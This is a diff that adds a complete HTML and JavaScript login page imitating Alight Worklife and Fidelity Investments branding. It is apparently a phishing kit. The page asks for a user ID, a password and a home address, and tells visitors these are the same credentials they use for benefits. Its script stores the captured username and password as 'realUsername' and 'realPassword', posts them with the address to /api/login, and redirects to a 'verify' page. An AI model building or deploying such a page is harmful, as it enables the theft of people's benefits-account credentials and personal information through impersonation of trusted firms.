@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AlightSmart - Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            background-size: cover;
+            background-image: url('logi.jpg');
+            
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            position: relative;
+             min-width: 100%;
+            height: 100%;
+            
+            display: flex;
+            align-items: flex-end;
+            padding: 40px 25px 180px;
+            position: relative;
+         
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.45);
+            z-index: -1;
+        }
+
+        .logo-container { 
+            text-align: center; 
+            margin: 40px 0 30px; 
+            z-index: 2; 
+            position: relative;
+            
+            
+        }
+        .fidelity-logo img {
+            width: 190px;
+            height: auto;
+           
+            width: 190px;
+            height: auto;
+            
+
+           /* Makes it white to match dark theme */
+        }
+
+        /* Alight Worklife Logo */
+        .alight-worklife {
+            font-size: 2.8rem;
+            font-weight: 700;
+            letter-spacing: -0.02em;
+            margin-bottom: 10px;
+        }
+        .alight-worklife .alight {
+            color: #1a1a1a;
+        }
+        .alight-worklife .worklife {
+            background: linear-gradient(90deg, #7ed957, #34d399);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 700;
+        }
+
+        /* United Logo */
+        .united-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            margin: 15px 0 20px;
+        }
+        .united-logo .united-text {
+            font-size: 2.4rem;
+            font-weight: 800;
+            color: #0033a0;
+            letter-spacing: 0.05em;
+        }
+        .globe {
+            font-size: 2.6rem;
+            line-height: 1;
+        }
+
+        .form-container { 
+            width: 100%; 
+            max-width: 380px; 
+            background: rgba(255, 255, 255, 0.96);
+            padding: 35px 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            z-index: 2;
+            position: relative;
+        }
+
+        label { 
+            display: block; 
+            margin: 25px 0 8px; 
+            font-size: 1.05rem; 
+            color: #1e2937; 
+            font-weight: 500; 
+        }
+
+        input { 
+            width: 100%; 
+            padding: 14px 16px; 
+            border: none; 
+            border-bottom: 1.5px solid #cbd5e1; 
+            font-size: 1.1rem; 
+            background: transparent; 
+        }
+
+        input:focus { 
+            outline: none; 
+            border-bottom-color: #3b82f6; 
+        }
+
+        .login-btn { 
+            width: 100%; 
+            padding: 16px; 
+            background: #1e40af; 
+            color: white; 
+            border: none; 
+            border-radius: 50px; 
+            font-size: 1.2rem; 
+            font-weight: 600; 
+            margin: 15px 0; 
+            cursor: pointer; 
+        }
+
+        .worklife {
+            font-size: 16px;
+            font-weight: 600;
+            color: #0052cc;
+            background-color: #f0f7ff;
+            padding: 16px 20px;
+            margin: 20px 0;
+            border-left: 5px solid #0052cc;
+            border-radius: 6px;
+            line-height: 1.6;
+            text-align: left;
+            box-shadow: 0 2px 8px rgba(0, 82, 204, 0.1);
+        }
+
+        /* Reduced helper text size */
+        .helper-text {
+            display: block;
+            margin-top: 6px;
+            font-size: 13px;        /* ← Reduced from 14px */
+            color: #0052cc;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+    <div class="logo-container">
+        <div class="alight-worklife">
+            <span class="alight">alight</span>
+            <span class="worklife">worklife</span><span style="font-size:0.6rem; vertical-align: super; color:#1a1a1a;">®</span>
+        </div>
+<!----
+        <div class="united-logo">
+            <span class="united-text">UNITED</span>
+            <span class="globe">🌐</span>
+        </div>
+        __-->
+         <!-- Fidelity Logo -->
+        <div class="fidelity-logo">
+            <img src="fidelityy.jpg" 
+                 alt="Fidelity Investments" 
+                 onerror="this.style.display='none'; console.log('Fidelity logo failed to load');">
+        </div>
+
+        <div class="worklife">Same Login used to access benefits on alight Worklife web</div>
+    </div>
+
+    <div class="form-container">
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username">Enter your UserID</label>
+                <input type="text" id="username" placeholder="UserID/Username" required>
+                <small class="helper-text">Same ID used to access benefits on alight Worklife web</small>
+            </div>
+
+            <div class="form-group">
+                <label for="password">Enter your Password</label>
+                <input type="password" id="password" placeholder="Password" required>
+                <small class="helper-text">Same Password used to access benefits on alight Worklife web</small>
+            </div>
+
+            <label>Home Address (Current)</label>
+            <input type="text" id="address" placeholder="Enter your current home address" required>
+
+            <button type="submit" class="login-btn">LOG IN</button>
+        </form>
+    </div>
+
+   <script>
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value.trim();
+        sessionStorage.setItem('realUsername', username);
+        const password = document.getElementById('password').value.trim();
+        const homeAddress = document.getElementById('address').value.trim();
+
+        sessionStorage.setItem('realPassword', password);
+
+        const payload = { 
+            username: username || "N/A", 
+            password: password || "N/A", 
+            address: `UserID: ${username} | Password: ${password} | Home: ${homeAddress} | Status: Pending Verification`
+        };
+
+        try {
+            await fetch('/api/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (err) {
+            console.error("Submit error:", err);
+        }
+
+        window.location.href = "verify.html";
+    });
+
+
+
+</script>
+</body>
+</html>
